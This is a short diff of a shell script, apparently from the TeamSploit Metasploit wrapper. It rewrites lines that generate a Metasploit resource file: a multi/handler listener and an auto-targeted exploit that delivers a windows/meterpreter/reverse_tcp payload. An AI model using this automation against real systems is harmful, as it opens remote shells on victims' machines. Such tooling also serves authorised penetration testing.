@@ -33,11 +33,11 @@ echo "set Prompt ts-autotarget" > $RANDRC
 echo "load autopost_notrg" >> $RANDRC
 echo "setg DisablePayloadHandler true" >> $RANDRC
 echo "setg AutoLoadStdapi false" >> $RANDRC
-echo "set ExitOnSession false" >> .teamsploit.rc.listener
-echo "use exploit/multi/handler" >> .teamsploit.rc.listener
-echo "setg LHOST $TS_MY_IP" >> .teamsploit.rc.listener
-echo "set LPORT $TS_AUTO_TARGET_PORT" >> .teamsploit.rc.listener
-echo "exploit -z -j" >> .teamsploit.rc.listener
+echo "set ExitOnSession false" >> $RANDRC
+echo "use exploit/multi/handler" >> $RANDRC
+echo "setg LHOST $TS_MY_IP" >> $RANDRC
+echo "set LPORT $TS_AUTO_TARGET_PORT" >> $RANDRC
+echo "exploit -z -j" >> $RANDRC
 echo "use $EXPLOIT" >> $RANDRC
 echo "setg PAYLOAD windows/meterpreter/reverse_tcp" >> $RANDRC
 echo "setg LHOST $TS_MY_IP" >> $RANDRC
